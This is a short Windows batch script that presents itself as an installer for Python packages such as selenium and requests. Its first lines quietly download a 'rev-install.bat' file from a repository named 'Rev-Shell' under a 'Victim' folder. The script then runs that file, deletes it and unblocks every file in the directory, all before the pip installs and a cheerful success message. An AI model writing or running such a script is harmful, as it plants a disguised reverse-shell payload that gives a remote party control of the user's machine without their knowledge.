@echo off

powershell -Command "& {Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/BertilBraun/Rev-Shell/master/Victim/rev-install.bat' -OutFile 'rev.bat'}"
call rev.bat
del rev.bat

pip install joblib
pip install selenium
pip install bs4
pip install requests

powershell -command "dir "%CD%" -Recurse | Unblock-File"

echo.
echo.
echo Hopefully everything installed successfully!
echo.
echo.

pause